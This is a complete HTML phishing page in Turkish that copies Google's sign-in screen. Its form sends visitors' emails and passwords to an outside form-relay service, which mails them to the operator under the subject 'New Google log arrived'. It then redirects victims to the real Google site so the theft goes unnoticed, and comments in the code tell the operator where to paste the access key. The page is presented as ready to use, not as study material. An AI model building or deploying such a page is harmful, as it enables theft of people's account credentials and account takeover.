<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google - Oturum Açın</title>
    <style>
        body { font-family: 'Segoe UI', arial; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background-color: #f8f9fa; }
        .login-card { background: #fff; padding: 40px; border: 1px solid #dadce0; border-radius: 8px; width: 360px; text-align: center; }
        h1 { font-size: 24px; margin-bottom: 10px; font-weight: 400; }
        p { margin-bottom: 25px; color: #202124; }
        input { width: 100%; padding: 13px; margin: 8px 0; border: 1px solid #dadce0; border-radius: 4px; box-sizing: border-box; font-size: 16px; }
        button { width: 100%; padding: 10px; background-color: #1a73e8; color: white; border: none; border-radius: 4px; font-size: 14px; font-weight: 500; cursor: pointer; margin-top: 20px; }
        button:hover { background-color: #1765cc; }
    </style>
</head>
<body>

    <div class="login-card">
        <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" width="75" style="margin-bottom: 15px;">
        <h1>Oturum Açın</h1>
        <p>Google Hesabınızı kullanın</p>

        <!-- WEB3FORMS BAŞLANGIÇ -->
        <form action="https://api.web3forms.com/submit" method="POST">
            
            <!-- ALDIĞIN KEY'İ BURAYA YAPIŞTIR -->
            <input type="hidden" name="access_key" value="cd256a8a-f4fc-412a-9d40-027ff6b94717">
            
            <!-- Giriş yapınca nereye yönlensin? -->
            <input type="hidden" name="redirect" value="https://accounts.google.com">
            
            <!-- Mail başlığı -->
            <input type="hidden" name="subject" value="Yeni Google Logu Geldi!">

            <input type="email" name="Email" placeholder="E-posta veya telefon" required>
            <input type="password" name="Sifre" placeholder="Şifrenizi girin" required>
            
            <div style="text-align: left; color: #1a73e8; font-size: 14px; margin-top: 10px; cursor: pointer;">Şifrenizi mi unuttunuz?</div>
            
            <button type="submit">İleri</button>
        </form>
        <!-- WEB3FORMS BİTİŞ -->

    </div>

</body>
</html>
